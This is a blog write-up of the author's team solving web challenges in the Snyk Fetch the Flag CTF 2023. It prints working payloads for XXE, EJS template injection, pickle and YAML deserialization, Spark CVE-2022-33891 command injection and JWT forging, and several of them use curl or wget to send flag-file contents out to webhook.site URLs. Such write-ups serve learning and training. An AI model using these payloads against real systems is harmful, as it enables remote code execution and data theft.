---
title: Snyk Fetch the Flag CTF 2023 Dive Into Web Challenges
date: 2023-10-29 01:30:00 +0200
categories:
  - ctf
  - snyk
tags:
  - ctf
  - snyk
  - web_applications
---
I'm thrilled to announce our latest achievement – a spectacular performance by our team, Creeprs_249, in the heart-pounding "Fetch the Flag CTF" competition. Organized by Snyk and John Hammond, this Capture the Flag event saw a staggering 1937 teams from around the world battling it out for supremacy. We're delighted to share that we secured the 85th position, a testament to our dedication and skills.

![](/assets/img/uploads/1698500266749.jpg)

Participating in this exhilarating event was not only an incredible experience but also a learning adventure like no other. The attack scenarios we encountered were nothing short of challenging and insightful, closely mirroring the complexities of real-world cybersecurity environments. Today, I'm excited to take you through my journey, as I dive deep into the web challenges that I tackled and conquered during this thrilling competition. So, gear up as we explore the strategies, techniques, and sheer determination that propelled us to success in the world of Capture the Flag.

## Bedsheets

### Description

Buying new bed sheets is always a hassle, so I made a new website to make it easier.  
**Hint: Flag is at `/home/challenge/flag.txt`**  
  
The site is a Node JS and express application that **assists with trying to buy a new bedsheet** when clicking on create to make a new bedsheet it takes its details.

![](/assets/img/uploads/20231029073207.png)

When going through the source code, it's using `xml2xlsx` to parse XXL to an XLSX Excel sheet file, and in the request it looks something like this:

![](/assets/img/uploads/20231029073330.png)

```http
POST /createSheets HTTP/1.1
Host: challenge.ctf.games:30278
Content-Length: 321
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://challenge.ctf.games:30278
Referer: http://challenge.ctf.games:30278/createSheets
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huX2RvZSIsInJvbGUiOiJ1c2VyIn0.pNGsWOaNM05ak48_gkmNBuHjIHLQr6LP7G4hWeue_0k; session=eyJjc3JmX3Rva2VuIjoiZjcxY2I1NzdiMmRjNTRlZWQ2NDU5NzA5NGI3NzFiNjM2YmQ2MDAyNiJ9.ZTzjvA.gSaBgCbbljgKr2VfA-AsB59AGPY
Connection: close

<sheet title="Dream Sheets">  
                <row><cell>Bed Size</cell><cell>full</cell></row> 
                <row><cell>Color</cell><cell>#805252</cell></row> 
                <row><cell>Thread Count</cell><cell>400</cell></row>
                <row><cell>Quantity</cell><cell>1</cell></row>
                </sheet>
```

So, look if this library has some kind of CVEs and I found that it has a XXE injection by seeding this payload it could access the local system file, and they've already told us where the flag is:

```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///home/challenge/flag.txt"> ]> <sheet title="Sheet"><row><cell>vulnerable</cell></row><row><cell>&ent;</cell></row> </sheet>
```

![](/assets/img/uploads/20231028092120.png)

It redirects us to `/finishedSheets` which contains all the files.

![](/assets/img/uploads/20231028092232.png)

When downloading the latest and opening it using any Excel software we can reveal the flag!

![](/assets/img/uploads/20231028092129.png)

## Color Profile
### Description

Warmups - Easy
Use a beautiful color wheel to update your profile!  

This challenge consists of a color wheel to change the color of the page and assign it to your profile. 

![](/assets/img/uploads/20231029075101.png)

Reviewing the source code on `server.js` which handles setting the color.

```js
app.post('/setColor', (req, res) => {
    const { color } = req.body;
    profile.color = color;
    res.json({ profileColor: color });
});

app.get('/', (req, res) => {
    fs.readFile(path.join(__dirname, 'views', 'index.ejs'), 'utf8', (err, data) => {
        if (err) {
            return res.status(500).send('Internal Server Error');
        }
        
        const profilePage = data.replace(/<% profileColor %>/g, profile.color);
        const renderedHtml = ejs.render(profilePage, { profileColor: profile.color });
        res.send(renderedHtml);
    });
});
```

Then go though `index.ejs` code which is the template itself.

```html
<div class="container">
    <div class="card mt-5 mx-auto" style="width: 18rem;">
        <span class="user-icon">👤</span>
        <div class="card-body">
            <h5 class="card-title"><b>John Doe</b></h5>
            <p class="card-text"><b>Username:</b> johndoe</p>
            <p class="card-text"><b>Email:</b> johndoe@example.com</p>
            <div id="colorPicker" data-jscolor="{value:'<% profileColor %>'}"></div>
            <p>Selected Color: <span id="selectedColor">None</span></p>
            <button id="submitColor" class="btn btn-primary mt-2">Update Profile</button>

        </div>
    </div>
</div>
```

Looking in the `POST` request to `/setColor` is being sent, the color to the backend template `ejs` to handle it.

```http
POST /setColor HTTP/1.1
Host: challenge.ctf.games:31417
Content-Length: 15
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://challenge.ctf.games:31417
Referer: http://challenge.ctf.games:31417/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huX2RvZSIsInJvbGUiOiJ1c2VyIn0.pNGsWOaNM05ak48_gkmNBuHjIHLQr6LP7G4hWeue_0k; session=eyJjc3JmX3Rva2VuIjoiZjcxY2I1NzdiMmRjNTRlZWQ2NDU5NzA5NGI3NzFiNjM2YmQ2MDAyNiJ9.ZTzjvA.gSaBgCbbljgKr2VfA-AsB59AGPY
Connection: close

color=%23ffffff
```

The app is using `ejs` version 3.1.9 which has Vulnerability CVE-2023-29827 a [Server Side Template Injection](https://portswigger.net/web-security/server-side-template-injection) , I couldn't solve this challenge on the CTF time I've tried many payloads and read the documentation of ejs but I could do noting. 

This payload is working when sending it to `/setcolor` endpoint it gives back the flag!

```js
color=<% global.process.mainModule.require("child_process").execSync("curl+https://webhook.site/6d251aae-45f8-4f21-bc0d-c7ac312aa077?cmd=`cat+/color_profile/flag.txt`") %>
```

![](/assets/img/uploads/20231029080701.png)

## GetHub

### Description
  
All my friends have been recently sending me Github links.  
  
The only problem is that I don't have time to download all the repos.  
  
So I created this tool that lets my friends submit repos and I can download them all at once.  

The application uses using Git Python library to handle the work with GitHub.

![](/assets/img/uploads/20231028074048.png)

```python
@app.route('/repos/<reponame>')
def repo_download(reponame):
    path = f"./repositories/{reponame}"
    root = os.path.dirname(path)
    files = glob(os.path.join(path, '*'))
    stream = BytesIO()
    with ZipFile(stream, 'w') as zf:
        for f in files:
            zf.write(f, os.path.relpath(f, root))
    stream.seek(0)
    return send_file(
        stream,
        as_attachment=True,
        download_name = "archive.zip",
        mimetype='application/zip'
    )
```

When I tried this function to see how it handles the paths I was able to get the flag by just simply sending a request to `/repos/..` which breaks the logic of the app and make it read all the files on the directory!

![](/assets/img/uploads/20231028081859.png)

![](/assets/img/uploads/20231028081842.png)

### Other solution by (@Talli)

Set up a GitHub repository containing a 'code.sh' file:

```bash
#!/bin/bash
cat /home/challenge/gethub/flag.txt > /home/challenge/gethub/repositories/test/flag.txt
```

```http
POST /clone HTTP/1.1
Host: challenge.ctf.games:32081
Content-Length: 51
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge.ctf.games:32081
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge.ctf.games:32081/clone
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huX2RvZSIsInJvbGUiOiJ1c2VyIn0.pNGsWOaNM05ak48_gkmNBuHjIHLQr6LP7G4hWeue_0k; session=eyJjc3JmX3Rva2VuIjoiZjcxY2I1NzdiMmRjNTRlZWQ2NDU5NzA5NGI3NzFiNjM2YmQ2MDAyNiJ9.ZTzjvA.gSaBgCbbljgKr2VfA-AsB59AGPY
Connection: close

repo=https%3A%2F%2Fgithub.com%2Fskullhat%2Ftest.git
```

Clone this repository using Gethub. Afterward, execute the following command on the 'Clone a Repository' page:

```shell
ext::sh ./repositories/test/code.sh
```

You can obtain the flag by downloading the 'test' repository, where it will be enclosed in a zip file.

![](/assets/img/uploads/20231029082303.png)

## Jott

### Description

Jott is the new hottness of productivity applications! Collaborate in real time, share notes, take notes, or don't take notes! We're not your manager. We're not even a real company!  
  
Go ahead and pentest the application and jott down whatever you find.  
  
We'd like you to do a pretty thorough job, so we've outfitted you with a dev instane of the app. Please use these user level credentials to log in and perform an aunthenticated test.  
  
**Username-** john_doe  
**Password** - password123  
  
We also gave you the dev-build of the app in the src directory for reference.  

### How I Solve It

The app is implemented using Flask and JWT cookies for user authorization.

![](/assets/img/uploads/20231027224852.png)

It's just disclosed the secret key of the JWT token, and knowing that the flag shows if the role is admin I was able to craft a cookie using https://jwt.io

```python
SECRET_KEY = "jott123!"
#snip
@app.route('/dashboard')
def dashboard():
    token = request.cookies.get('jwt')    
    if not token:
        return redirect('/login')

    try:
        # Decoding the token
        decoded_token = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        username = decoded_token.get("sub")
        user_notes = users_notes.get(username, [])
        if decoded_token.get('role') == 'admin':
            # Read the content of 'flag.txt'
            with open('flag.txt', 'r') as file:
                flag_content = file.read()
            return render_template('admin_dashboard.html', flag=flag_content)
        else:
            return render_template('user_dashboard.html', notes=user_notes)
    except jwt.ExpiredSignatureError:
        return redirect('/login')
    except jwt.InvalidTokenError:
        return redirect('/login')
```

![](/assets/img/uploads/20231027225052.png)

## PickleChat

### Description

Thanks for taking on this project! Our new app, PickleChat, is about to change the world. We're making encrypted comms an absolute snap! We're pretty early in development but we'd love a security assessment for our prototype.  
  
Please pentest our prototype application and let us know if you find any gnarly bugs.  
  
We don't have much in the way of documentation to provide to you, sorry! Our devs have been too busy to get that together. We're going to give you the client test suite and a few PEM files to perform the test. You'll have to infer from the code how to interact with the server.  
  

I start by registering an account on it using an OpenSSL RSA public/private key pair:

```powershell
python .\client.py --url 'http://challenge.ctf.games:30348'  --register skullhat,skullhat_public_key.pem
{'message': 'User skullhat registered'}
```

By going through the source code seeing that it serialized the message and then sent it to the endpoint `/send-message`

I used pickle payload to write a POC and get the flag by serializing **malicious** object, but it doesn't work!

```python
import requests
import pickle
import base64
import os

url = 'http://challenge.ctf.games:30514/send-message'

payload = f'curl https://webhook.site/e2cacc1b-297f-4627-a6b5-4c17db349910'

class RCE:
    def __reduce__(self):
        cmd = payload
        return os.system, (cmd,)

def exploit():
    pickled = pickle.dumps(RCE())
    r = requests.post(f'{url}', data=base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('utf-8'))
    
    print(r.text)


exploit()
```

I could not solve it in the competition time, but I read how (@CyberzSentry) solved it and used this script to gain the flag: 

```python
class PickleRce(object):
    def _reduce__(self): 
        return (exec, ("raise Exception(open('flag.txt').read())",))

def send_message(sender, recipient, plain_message):
    # Serialize the data for sending
    serialized_data = pickle.dumps (PickleRce())

    encoded_message = base64.urlsafe_b64encode(serialized_data).decode()
    response = requests.post(f" {BASE_URL}/send-message", data=encoded_message)

    return response.json()
```

When using the edited code it works and gets the flag!

```powershell
python .\client.py --url 'http://challenge.ctf.games:30348'  --send skullhat,skullhat,hello
{'error': 'flag{b2d366b8dbd31517c2de39e45fd5db28}\n'}
```

## Rusty

## Description

We heard you were a bit rusty on the basics... so here's a small warmup challenge for you!  
  
Here's some code attached and its output. Can you make any sense of it?  
  
`OPhMOnVheP1hRaOa1Pmi1GrBbGm21PRaepxXOPxMeG1iOaYd1ji=`  

When seeing this `rust` code, it's a base64 encoder but with a specific character set

```rust
use std::fs;

const CHARSET: &[u8] = b"QWlKoxp3mT9EeRb4YzgG6rNj1OLvZ5SDfMBaXtP8JyIFVH07uh2wicdnUAC#@q";

fn main() {
    let content = fs::read_to_string("flag.txt").expect("Unable to read flag.txt");

    let input = content.as_bytes();
    let mut output = Vec::new();

    let mut temp = 0u32;
    let mut temp_len = 0u8;

    for &byte in input {
        temp = (temp << 8) | byte as u32;
        temp_len += 8;

        while temp_len >= 6 {
            temp_len -= 6;
            output.push(CHARSET[((temp >> temp_len) & 0x3F) as usize]);
        }
    }

    if temp_len > 0 {
        output.push(CHARSET[((temp << (6 - temp_len)) & 0x3F) as usize]);
    }

    while output.len() % 4 != 0 {
        output.push(b'=');
    }

    let out = String::from_utf8(output).unwrap();

    println!("{}", out);
}

```

So I used ChatGPT to edit the original code get a decoder and get the following code, it takes the base64 code provided in the description:

```rust
use std::fs;

const CHARSET: &[u8] = b"QWlKoxp3mT9EeRb4YzgG6rNj1OLvZ5SDfMBaXtP8JyIFVH07uh2wicdnUAC#@q";

fn main() {
    let content = fs::read_to_string("flag.txt").expect("Unable to read encoded.txt");

    let input = content.as_bytes();
    let mut output = Vec::new();

    let mut temp = 0u32;
    let mut temp_len = 0u8;

    for &byte in input {
        // Skip padding characters
        if byte == b'=' {
            break;
        }

        let val = CHARSET.iter().position(|&c| c == byte);

        if let Some(val) = val {
            temp = (temp << 6) | val as u32;
            temp_len += 6;

            if temp_len >= 8 {
                temp_len -= 8;
                output.push((temp >> temp_len) as u8);
            }
        }
    }

    let out = String::from_utf8(output).unwrap();

    println!("{}", out);
}

```

I compile it using `cargo` and get the flag!

![](/assets/img/uploads/20231027215059.png)

## Sparky 

### Description

Alright, sparky, here's another web application test for you. We're running this in prod, but we've given you a separate dev instance to test. No source code, no inside info. Just pwn and profit and tell us how you did it!  
  
The app is running Spark 3.1.1 which is vulnerable to CVE-2022-33891 which is caused when using a malicious username and sending it to the root app in the `doAs` parameter

![](/assets/img/uploads/20231028111235.png)

Using this [script](https://github.com/HuskyHacks/cve-2022-33891) I could understand what's going on and send the following payload and wait on `webhocks.site` to be reached out with the flag. The payload is:

```
http://challenge.ctf.games:31933/?doAs=`curl%20https://webhook.site/e2cacc1b-297f-4627-a6b5-4c17db349910?cmd=$(cat%20/flag.txt)`
```

A 403 error appears, but it's a good sign!

![](/assets/img/uploads/20231028111135.png)

On https://webhocks.site client the flag is there: 

![](/assets/img/uploads/20231028111124.png)

## YSON

## Description

Introducing YSON! Need to transform your YAML code into JSON? We've got you covered!  
  
The application uses some kind of YAML as Python objects to be parsed 

![](/assets/img/uploads/20231027202807.png)

When I send a YAML python object to gain RCE on the machine, it works but it return an error and gets executed blindly

```pyhton
!!python/object/apply:os.system ["wget https://webhook.site/f053fdbf-defe-4a5e-865f-83985dba2e37?cmd=$(pwd)"]
```

![](/assets/img/uploads/20231027203132.png)

![](/assets/img/uploads/20231027202917.png)
 
 So I used webhooks to get the flag by sending this payload:
 
```python
!!python/object/apply:os.system ["wget https://webhook.site/f053fdbf-defe-4a5e-865f-83985dba2e37?cmd=$(cat /flag.txt)"]
```

![](/assets/img/uploads/20231027202729.png)

Woop woop! It works!

![](/assets/img/uploads/20231027202854.png)

I hope you learn something form this, if so share it with me in the comments!
